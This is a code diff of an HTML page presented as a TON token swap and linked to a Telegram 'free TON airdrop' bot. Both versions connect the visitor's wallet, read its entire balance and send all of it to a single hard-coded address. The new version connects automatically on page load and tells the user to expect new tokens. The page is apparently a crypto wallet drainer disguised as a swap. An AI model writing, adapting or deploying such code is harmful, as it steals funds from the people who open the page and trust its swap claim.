@@ -3,77 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON to DOGS Swap</title>
+    <title>TON Connect Example with Token Swap</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@ton/ton@latest/dist/ton.js"></script>
 </head>
 <body>
-    <h1>TON to DOGS Swap</h1>
-    <button id="connectWalletButton">Connect Wallet</button>
-    <button id="swapButton" disabled>Swap TON for DOGS</button>
-    <div id="status"></div>
+    <div id="ton-connect"></div>
+    <div id="swap-info" style="display:none;">
+        <h2>Token Swap</h2>
+        <p>Balance: <span id="balance"></span> TON</p>
+        <button onclick="performSwap()">Swap all TON for New Token</button>
+    </div>
+
     <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
-            buttonRootId: 'connectWalletButton'
+            buttonRootId: 'ton-connect'
         });
         tonConnectUI.uiOptions = {
             twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
         };
 
-        const connectWallet = async () => {
+        async function connectToWallet() {
             try {
-                await tonConnectUI.openModal();
-                const walletAddress = await tonConnectUI.account.address;
-                document.getElementById('connectWalletButton').disabled = true;
-                document.getElementById('swapButton').disabled = false;
-                document.getElementById('status').innerText = 'Wallet connected.';
+                const connectedWallet = await tonConnectUI.connectWallet();
+                console.log(connectedWallet);
+                
+                // After successful connection, get the balance and show swap info
+                const balance = await getWalletBalance(connectedWallet.address);
+                document.getElementById('balance').textContent = balance;
+                document.getElementById('swap-info').style.display = 'block';
             } catch (error) {
-                console.error('Error connecting wallet:', error);
-                document.getElementById('status').innerText = 'Error connecting wallet.';
+                console.error("Error connecting to wallet:", error);
             }
-        };
+        }
 
-        const getTONBalance = async (address) => {
+        async function getWalletBalance(address) {
             const client = new ton.TonClient({
                 endpoint: 'https://toncenter.com/api/v2/jsonRPC'
             });
             const balance = await client.getBalance(address);
             return ton.fromNano(balance);
-        };
+        }
 
-        const prepareSwapTransaction = async () => {
-            const walletAddress = await tonConnectUI.account.address;
-            const balance = await getTONBalance(walletAddress);
-
-            const swapTransaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes validity
-                messages: [
-                    {
-                        address: 'EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY', // Replace with the actual contract address
-                        amount: balance, // Full TON amount
-                        payload: 'te6ccgEBAQEABgAACCiAmCM=', // Example payload, adjust according to your contract
-                    },
-                ],
-            };
-
-            return swapTransaction;
-        };
-
-        const executeSwap = async () => {
-            const transaction = await prepareSwapTransaction();
-
+        async function performSwap() {
             try {
-                const result = await tonConnectUI.sendTransaction(transaction);
-                console.log('Transaction sent:', result);
-                document.getElementById('status').innerText = 'Transaction sent successfully.';
+                // Here you would typically interact with your smart contract
+                // This is a placeholder for the actual swap logic
+                const swapContractAddress = 'EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY'; // Replace with your actual contract address
+                const result = await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 60 * 20, // 20 minutes from now
+                    messages: [
+                        {
+                            address: swapContractAddress,
+                            amount: await getWalletBalance(tonConnectUI.wallet.address),
+                            payload: 'te6ccgEBAQEABgAACCiAmCM=', // Replace with your actual payload
+                        },
+                    ],
+                });
+                console.log('Swap transaction sent:', result);
+                alert('Swap initiated! Check your wallet for the new tokens.');
             } catch (error) {
-                console.error('Error sending transaction:', error);
-                document.getElementById('status').innerText = 'Error sending transaction.';
+                console.error('Error performing swap:', error);
+                alert('Error performing swap. Please try again.');
             }
-        };
+        }
 
-        document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
-        document.getElementById('swapButton').addEventListener('click', executeSwap);
+        // Call the function to connect wallet when the page loads
+        connectToWallet();
     </script>
 </body>
 </html>
